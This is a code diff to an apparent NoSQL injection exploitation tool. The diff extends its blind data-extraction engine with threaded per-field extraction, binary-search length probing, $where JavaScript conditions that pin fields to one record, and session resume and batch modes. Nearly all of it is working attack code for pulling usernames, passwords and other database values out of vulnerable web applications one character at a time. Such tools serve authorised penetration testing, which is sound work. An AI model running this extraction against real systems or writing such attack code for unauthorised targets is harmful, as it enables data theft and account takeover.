@@ -13,6 +13,7 @@
 #               $where this.<field> (works even on strict-key logins)
 # Plumbing:     persistent session + optional anti-CSRF token carried per request
 
+import concurrent.futures
 import difflib
 import json as _json
 import os
@@ -23,6 +24,8 @@ import time
 import urllib.parse
 
 import requests
+
+from . import nsmstore
 
 try:
     import urllib3
@@ -128,6 +131,11 @@ def args():
         ["--noWhere", "Skip the $where JavaScript technique (y)"],
         ["--level", "Payload breadth from the catalog: 1 (default, fast), 2, or 3 (widest set of operators/$where templates)"],
         ["--risk", "Payload risk tier: 1 (default, safe), 2, or 3 (includes more intrusive operators)"],
+        ["--threads", "Concurrent requests for blind extraction (default 1; safe parallelism per character position)"],
+        ["--outputDir", "Write findings + extracted data here (NDJSON/CSV + run log); defaults to ./nosqlmap-out/<host>"],
+        ["--sessionFile", "SQLite session file for resume (defaults to <outputDir>/session.sqlite); re-runs reuse confirmed findings and extracted values"],
+        ["--noResume", "Ignore any saved session and re-probe from scratch (y)"],
+        ["--flushSession", "Delete the saved session for this target before running (y)"],
         ["--csrfField", "Form field carrying an anti-CSRF token (carried, refreshed, on every request)"],
         ["--csrfUrl", "URL to GET a fresh CSRF token from (default: the target URL)"],
         ["--csrfRegex", "Regex with one capture group for the token (default: derived from --csrfField)"],
@@ -906,15 +914,43 @@ def _char_class(chars):
     return "[" + esc + "]"
 
 
-def _walk_value(is_true, charset, maxlen, label="", widen=None):
+def _value_length(is_true, maxlen):
+    # Pre-probe the value length with /^.{n}/ (binary search): ~log2(maxlen)
+    # requests.  Lets the walk stop exactly at the end (no trailing ambiguity)
+    # and is the prerequisite for safe position-parallel extraction.  Returns
+    # None if the length oracle is unusable.
+    try:
+        if not is_true("^.{1}"):
+            return 0
+        if is_true("^.{%d}" % maxlen):
+            return maxlen                 # at least maxlen; treat the cap as the length
+        lo, hi = 1, maxlen                # lo known-true, hi known-false
+        while hi - lo > 1:
+            mid = (lo + hi) // 2
+            if is_true("^.{%d}" % mid):
+                lo = mid
+            else:
+                hi = mid
+        return lo
+    except Exception:
+        return None
+
+
+def _walk_value(is_true, charset, maxlen, label="", widen=None,
+                start="", length=None, on_char=None):
     # Binary-search each character: ~log2(len(charset)) requests per char.
     # If no active-charset char extends the value, try a wider charset ONCE
     # before stopping, so we don't silently truncate (e.g. the default charset
     # has no '{', so 'HTB' would look complete when the value is 'HTB{...}').
+    # `start` seeds a resumed prefix; `length` (if known) bounds the walk; and
+    # `on_char` is a checkpoint callback (current value) for session/resume.
     active = list(charset)
     widened = False
-    value = ""
-    while len(value) < maxlen:
+    value = start
+    limit = length if length is not None else maxlen
+    if label and value:
+        print("\r    %s: %s" % (label, value), end="")
+    while len(value) < limit:
         if not is_true("^" + re.escape(value) + _char_class(active)):
             if widen and not widened:
                 wider = [c for c in widen if c not in active]
@@ -933,6 +969,8 @@ def _walk_value(is_true, charset, maxlen, label="", widen=None):
             else:
                 lo = mid
         value += active[lo]
+        if on_char:
+            on_char(value)
         if label:
             print("\r    %s: %s" % (label, value), end="")
     if label:
@@ -1041,8 +1079,17 @@ def _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, ex
     return None
 
 
-def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target, exclude=None):
+def _pin_js(pin):
+    # JS that constrains the matched document to the already-known fields, so a
+    # record's fields all come from the SAME document (correlated extraction).
+    return "".join(" && String(this.%s)===%s" % (pf, _json.dumps(str(pv)))
+                   for pf, pv in (pin or {}).items())
+
+
+def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template,
+                   target, exclude=None, pin=None):
     excl_js = _json.dumps([str(x) for x in (exclude or [])])
+    pin_js = _pin_js(pin)
     def probe(testexpr):
         spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
         spec[inj_field] = ("lit", template % testexpr)
@@ -1057,7 +1104,7 @@ def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, tem
 
     def is_true(pattern):
         js_pat = pattern.replace("/", "\\/")
-        js = "this.%s!=null && /%s/.test(String(this.%s))" % (target, js_pat, target)
+        js = "this.%s!=null && /%s/.test(String(this.%s))%s" % (target, js_pat, target, pin_js)
         if exclude:                       # force enumeration onto a not-yet-found document
             js = "(%s) && %s.indexOf(String(this.%s))<0" % (js, excl_js, target)
         try:
@@ -1273,12 +1320,13 @@ def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, injec
     return []
 
 
-def _where_time_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target, meta, exclude=None):
+def _where_time_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target, meta, exclude=None, pin=None):
     efmt = meta.get("efmt", "sleep(%d)")
     delay = meta["delay"]
     thr = meta["threshold"]
     delay_js = efmt % delay
     excl_js = _json.dumps([str(x) for x in (exclude or [])])
+    pin_js = _pin_js(pin)
 
     def probe(js):
         spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
@@ -1287,7 +1335,7 @@ def _where_time_is_true(ctx, method, base_url, vector, fields_literal, inj_field
 
     def is_true(pattern):
         jsp = pattern.replace("/", "\\/")
-        cond = "this.%s!=null && /%s/.test(String(this.%s))" % (target, jsp, target)
+        cond = "this.%s!=null && /%s/.test(String(this.%s))%s" % (target, jsp, target, pin_js)
         if exclude:                       # force enumeration onto a not-yet-found document
             cond = "(%s) && %s.indexOf(String(this.%s))<0" % (cond, excl_js, target)
         js = "(%s) ? %s : 0" % (cond, delay_js)   # delay only when the char matches
@@ -1302,43 +1350,100 @@ def _where_time_is_true(ctx, method, base_url, vector, fields_literal, inj_field
 
 def extract(base_url, method, vector, fields_literal, field, headers=None, verify=False,
             charset=None, maxlen=64, exclude=None, pin=None, ctx=None, where=None,
-            ext_method="auto"):
+            ext_method="auto", store=None, probe_length=False, label=None):
     if ctx is None:
         ctx = Ctx(headers, verify)
     charset = charset or _CHARSET_DEFAULT
+    label = field if label is None else label
+
+    # Session/resume: a stable key for this exact extraction unit.
+    ck = None
+    resume_start = ""
+    if store is not None:
+        ck = nsmstore.context_key({
+            "vector": vector, "field": field, "method": ext_method,
+            "pin": sorted((pin or {}).items()), "exclude": sorted(exclude or []),
+            "where": (where.get("template"), bool(where.get("time"))) if where else None,
+        })
+        cached = store.get_value(ck)
+        if cached and cached["complete"]:
+            print("    %s = %s (resumed from session)" % (label, cached["value"]))
+            return cached["value"]
+        if cached and not cached["complete"]:
+            resume_start = cached["value"] or ""
+
+    def checkpoint(val):
+        if store is not None and ck is not None:
+            store.set_partial(ck, field, val, False, None)
+
+    def finish(val):
+        if val is not None and store is not None and ck is not None:
+            store.set_partial(ck, field, val, True, len(val))
+        return val
+
+    def walk(is_true):
+        length = _value_length(is_true, maxlen) if probe_length else None
+        if length == 0:
+            return ""
+        return _walk_value(is_true, charset, maxlen, label=label, widen=_CHARSET_FULL,
+                           start=resume_start, length=length, on_char=checkpoint)
 
     if ext_method in ("auto", "regex"):
         is_true = _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
         if is_true:
-            return _walk_value(is_true, charset, maxlen, label=field, widen=_CHARSET_FULL)
+            return finish(walk(is_true))
         typed = _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
         if typed is not None:
-            print("    %s = %s (typed)" % (field, typed))
-            return str(typed)
+            print("    %s = %s (typed)" % (label, typed))
+            return finish(str(typed))
 
     if where and ext_method in ("auto", "where"):
         if where.get("time"):
             wis = _where_time_is_true(ctx, method, base_url, vector, fields_literal,
-                                      where["field"], where["template"], field, where, exclude)
+                                      where["field"], where["template"], field, where, exclude, pin)
         else:
             wis = _where_is_true(ctx, method, base_url, vector, fields_literal,
-                                 where["field"], where["template"], field, exclude)
+                                 where["field"], where["template"], field, exclude, pin)
         if wis:
-            return _walk_value(wis, charset, maxlen, label=field, widen=_CHARSET_FULL)
+            return finish(walk(wis))
     return None
 
 
 def extract_record(base_url, method, vector, fields_literal, field_list, headers=None,
                    verify=False, charset=None, maxlen=64, exclude_first=None,
-                   ctx=None, where=None, ext_method="auto"):
+                   ctx=None, where=None, ext_method="auto", store=None, threads=1):
     if ctx is None:
         ctx = Ctx(headers, verify)
     record = {}
+
+    if threads > 1 and len(field_list) > 1:
+        # Threaded dump: extract the key field first, then the rest concurrently,
+        # each pinned to the key.  This assumes the FIRST field uniquely
+        # identifies the record (username / _id / email); the sequential path
+        # below makes no such assumption (it narrows cumulatively).
+        key = field_list[0]
+        v0 = extract(base_url, method, vector, fields_literal, key, charset=charset, maxlen=maxlen,
+                     exclude=exclude_first, pin={}, ctx=ctx, where=where,
+                     ext_method=ext_method, store=store)
+        record[key] = v0
+        if v0 is None:
+            return record
+        pin = {key: v0}
+
+        def one(f):
+            return f, extract(base_url, method, vector, fields_literal, f, charset=charset,
+                              maxlen=maxlen, exclude=None, pin=dict(pin), ctx=ctx, where=where,
+                              ext_method=ext_method, store=store, label=f)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
+            for f, v in ex.map(one, field_list[1:]):
+                record[f] = v
+        return record
+
     pin = {}
     for i, f in enumerate(field_list):
         v = extract(base_url, method, vector, fields_literal, f, charset=charset, maxlen=maxlen,
                     exclude=(exclude_first if i == 0 else None), pin=dict(pin),
-                    ctx=ctx, where=where, ext_method=ext_method)
+                    ctx=ctx, where=where, ext_method=ext_method, store=store)
         record[f] = v
         if i == 0 and v is None:
             break
@@ -1348,7 +1453,8 @@ def extract_record(base_url, method, vector, fields_literal, field_list, headers
 
 
 def extract_records(base_url, method, vector, fields_literal, field_list, headers=None,
-                    verify=False, charset=None, maxlen=64, ctx=None, where=None, ext_method="auto"):
+                    verify=False, charset=None, maxlen=64, ctx=None, where=None,
+                    ext_method="auto", store=None, threads=1):
     if ctx is None:
         ctx = Ctx(headers, verify)
     records = []
@@ -1356,33 +1462,40 @@ def extract_records(base_url, method, vector, fields_literal, field_list, header
     while True:
         rec = extract_record(base_url, method, vector, fields_literal, field_list,
                              charset=charset, maxlen=maxlen, exclude_first=list(seen),
-                             ctx=ctx, where=where, ext_method=ext_method)
+                             ctx=ctx, where=where, ext_method=ext_method, store=store, threads=threads)
         v0 = rec.get(field_list[0])
         if not v0 or v0 in seen:
             break
         seen.append(v0)
         records.append(rec)
+        if store is not None:
+            store.record_value(field_list[0], v0, context="record")
         print("    [+] record %d: %s" % (len(records),
               ", ".join("%s=%s" % (k, rec[k]) for k in field_list)))
+    if store is not None:
+        store.write_records(field_list, records)
     return records
 
 
 def extract_users(base_url, method, vector, fields_literal, field, headers=None, verify=False,
-                  charset=None, maxlen=64, ctx=None, where=None, ext_method="auto"):
+                  charset=None, maxlen=64, ctx=None, where=None, ext_method="auto", store=None):
     if ctx is None:
         ctx = Ctx(headers, verify)
     found = []
     while True:
         v = extract(base_url, method, vector, fields_literal, field, charset=charset, maxlen=maxlen,
-                    exclude=found, ctx=ctx, where=where, ext_method=ext_method)
+                    exclude=found, ctx=ctx, where=where, ext_method=ext_method, store=store)
         if not v or v in found:
             break
         found.append(v)
+        if store is not None:
+            store.record_value(field, v)
         print("    [+] %s[%d] = %s" % (field, len(found), v))
     return found
 
 
-def _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args, ext_method):
+def _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args, ext_method,
+                   store=None, threads=1, batch=False):
     if not strong:
         return
     raw = None
@@ -1401,6 +1514,8 @@ def _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args
         except (ValueError, TypeError):
             maxlen = 64
         multi = str(getattr(args, "extractUsers", "") or "").lower() == "y"
+    elif batch:
+        return
     else:
         if input("\nBlind-extract field value(s)? (y/n) ").lower() != "y":
             return
@@ -1424,29 +1539,43 @@ def _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args
         print("No $where injection confirmed; cannot force --extractMethod where.")
         return
 
-    print("\n[*] Extracting %s via %s vector (method=%s, charset=%d, max=%d)..."
-          % (field_list, vector, ext_method, len(charset), maxlen))
+    print("\n[*] Extracting %s via %s vector (method=%s, charset=%d, max=%d%s)..."
+          % (field_list, vector, ext_method, len(charset), maxlen,
+             ", threads=%d" % threads if threads > 1 else ""))
+    if threads > 1 and len(field_list) > 1:
+        print("    [threads] non-key fields fetched concurrently, pinned to '%s'"
+              " (assumes it uniquely identifies the record)." % field_list[0])
+    if store is not None:
+        store.log("extract fields=%s multi=%s method=%s threads=%d" % (field_list, multi, ext_method, threads))
 
     if multi:
         if len(field_list) == 1:
             vals = extract_users(base_url, method, vector, fields_literal, field_list[0],
-                                 charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
+                                 charset=charset, maxlen=maxlen, ctx=ctx, where=where,
+                                 ext_method=ext_method, store=store)
             print("[+] Recovered %d value(s): %s" % (len(vals), ", ".join(vals) if vals else "(none)"))
         else:
             recs = extract_records(base_url, method, vector, fields_literal, field_list,
-                                   charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
+                                   charset=charset, maxlen=maxlen, ctx=ctx, where=where,
+                                   ext_method=ext_method, store=store, threads=threads)
             print("[+] Recovered %d record(s):" % len(recs))
             for r in recs:
                 print("    " + ", ".join("%s=%s" % (k, r.get(k)) for k in field_list))
     else:
         if len(field_list) == 1:
             v = extract(base_url, method, vector, fields_literal, field_list[0],
-                        charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
+                        charset=charset, maxlen=maxlen, ctx=ctx, where=where,
+                        ext_method=ext_method, store=store)
+            if v is not None and store is not None:
+                store.record_value(field_list[0], v)
             print("[+] %s = %s" % (field_list[0], v) if v is not None
                   else "[-] Could not establish an extraction oracle for '%s'." % field_list[0])
         else:
             rec = extract_record(base_url, method, vector, fields_literal, field_list,
-                                 charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
+                                 charset=charset, maxlen=maxlen, ctx=ctx, where=where,
+                                 ext_method=ext_method, store=store, threads=threads)
+            if store is not None:
+                store.write_records(field_list, [rec])
             print("[+] Recovered record (one user):")
             for k in field_list:
                 print("    %s = %s" % (k, rec.get(k)))
@@ -1465,6 +1594,10 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
     retries = 2
     level = 1
     risk = 1
+    threads = 1
+    batch = bool(getattr(args, "batch", False)) if args is not None else False
+    output_dir = session_file = None
+    no_resume = flush_session = False
     a_true = a_false = a_regex = a_code = None
     if args is not None:
         cf = getattr(args, "csrfField", None)
@@ -1492,6 +1625,14 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
             risk = max(1, min(3, int(getattr(args, "risk", None) or 1)))
         except (ValueError, TypeError):
             risk = 1
+        try:
+            threads = max(1, min(32, int(getattr(args, "threads", None) or 1)))
+        except (ValueError, TypeError):
+            threads = 1
+        output_dir = getattr(args, "outputDir", None)
+        session_file = getattr(args, "sessionFile", None)
+        no_resume = str(getattr(args, "noResume", "") or "").lower() == "y"
+        flush_session = str(getattr(args, "flushSession", "") or "").lower() == "y"
         a_true = getattr(args, "trueString", None)
         a_false = getattr(args, "falseString", None)
         a_regex = getattr(args, "trueRegex", None)
@@ -1521,14 +1662,42 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
 
     if not fields_literal:
         print("No parameters to test.  Provide query params (GET) or POST data.")
-        if args is None:
+        if args is None and not batch:
             input("\nPress enter to continue...")
         return []
 
-    ctx = Ctx(headers, verify, csrf, timeout=max(15, int(delay_ms / 1000 * 5) + 5),
-              proxies=proxy, retries=retries, cookies=cookies,
-              assert_true=a_true, assert_false=a_false, assert_regex=a_regex, assert_code=a_code,
-              param_fields=param_fields, json_template=json_template, json_segmap=json_segmap)
+    store = None
+    if args is not None:
+        try:
+            store = nsmstore.Store(base_url, output_dir=output_dir, session_file=session_file,
+                                   no_resume=no_resume, flush=flush_session)
+            print("Output: %s%s" % (store.output_dir,
+                  "  (resume on)" if not no_resume else "  (resume off)"))
+            if threads > 1:
+                print("Threads: %d" % threads)
+            print("")
+        except Exception as e:                 # never let storage problems abort a scan
+            print("  [store] disabled (%s)" % e)
+            store = None
+
+    try:
+        return _run_inner(base_url, method, fields_literal, ctx_kw=dict(
+            headers=headers, verify=verify, csrf=csrf,
+            timeout=max(15, int(delay_ms / 1000 * 5) + 5), proxies=proxy, retries=retries,
+            cookies=cookies, assert_true=a_true, assert_false=a_false, assert_regex=a_regex,
+            assert_code=a_code, param_fields=param_fields, json_template=json_template,
+            json_segmap=json_segmap),
+            no_where=no_where, time_based=time_based, delay_ms=delay_ms,
+            inject_fields=inject_fields, vectors=vectors, level=level, risk=risk,
+            args=args, ext_method=ext_method, store=store, threads=threads, batch=batch)
+    finally:
+        if store is not None:
+            store.close()
+
+
+def _run_inner(base_url, method, fields_literal, ctx_kw, no_where, time_based, delay_ms,
+               inject_fields, vectors, level, risk, args, ext_method, store, threads, batch):
+    ctx = Ctx(**ctx_kw)
     findings = detect(base_url, method, fields_literal, no_where=no_where, ctx=ctx,
                       time_based=time_based, delay_ms=delay_ms,
                       inject_fields=inject_fields, vectors=vectors,
@@ -1581,9 +1750,16 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
             for f in weak:
                 print("[?] %s (%s): %s" % (f["label"], f["vector"], "; ".join(f["reasons"])))
 
+    if store is not None:
+        for f in findings:
+            try:
+                store.save_finding(f, _payload_repr(f["spec"], method, f["vector"]))
+            except Exception:
+                pass
+
     # Field/column discovery.
     do_discover = str(getattr(args, "discover", "") or "").lower() == "y" if args is not None else False
-    if args is None and strong:
+    if args is None and strong and not batch:
         do_discover = input("\nDiscover document field names? (y/n) ").lower() == "y"
     if do_discover and strong:
         discover_fields(ctx, method, base_url, strong[0]["vector"], fields_literal, findings)
@@ -1592,14 +1768,15 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
     do_dump = False
     if args is not None:
         do_dump = str(getattr(args, "dump", "") or "").lower() == "y"
-    elif strong:
+    elif strong and not batch:
         do_dump = input("\nDump in-band data (re-send match-all, show returned records)? (y/n) ").lower() == "y"
     if do_dump and strong:
         ab = [f for f in strong if f["label"].startswith("all-fields")] or strong
         dump_inband(ctx, method, base_url, ab[0]["vector"], fields_literal, ab[0])
 
-    _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args, ext_method)
+    _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args, ext_method,
+                   store=store, threads=threads, batch=batch)
 
-    if args is None:
+    if args is None and not batch:
         input("\nPress enter to continue...")
     return findings
